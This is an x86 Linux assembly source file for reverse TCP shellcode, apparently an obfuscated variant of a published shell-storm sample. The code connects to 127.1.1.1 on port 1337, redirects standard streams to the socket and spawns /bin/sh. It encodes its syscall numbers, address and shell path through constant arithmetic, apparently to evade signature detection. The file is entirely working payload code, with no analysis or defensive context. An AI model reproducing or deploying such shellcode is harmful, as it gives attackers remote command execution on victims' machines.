; reverse_shell.nasm
;  - Execute a reverse tcp shell
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-883.php

    global _start

section .text
_start:

	push 0x64		; mov eax, 0x66
	pop eax
	push 0x2		; mov ebx, 0x1
	pop ebx
	mov edi,ebx
	add eax,ebx
	xor edx,edx
	mov esi,eax
	dec ebx
	push edx		; push 0x0
	push ebx		; push 0x1
	push edi		; push 0x2
	mov ecx,esp
	int 0x80

	xchg edx,eax
	mov eax, esi		; mov eax, 0x66
	mov ecx, 0x4105fa92	; push <127.1.1.1>
	sub ecx, 0x4004f913
	push ecx
	sub ecx, 0x100c87a	; push <1337>
	push word cx
	mov bx, di		; inc ebx
	push bx
	mov ecx,esp
	push 0x10
	push ecx
	push edx
	mov ecx,esp
	inc ebx
	int 0x80

	mov ecx,edi		; mov ecx, 0x2
	xchg edx,ebx

loop:
	mov eax, esi		; mov eax,0x3f
	sub eax, 0x27
	int 0x80
	dec ecx
	jns loop

	mov eax, esi		; mov eax, 0xb
	sub eax, 0x5b
	inc ecx
	mov edx,ecx
	push edx
	mov edi, 0x2591f1f	; push </bin//sh>
	add edi, 0x661a1010
	push edi
	add edi, 0x5f63300
	push edi
	mov ebx,esp
	int 0x80
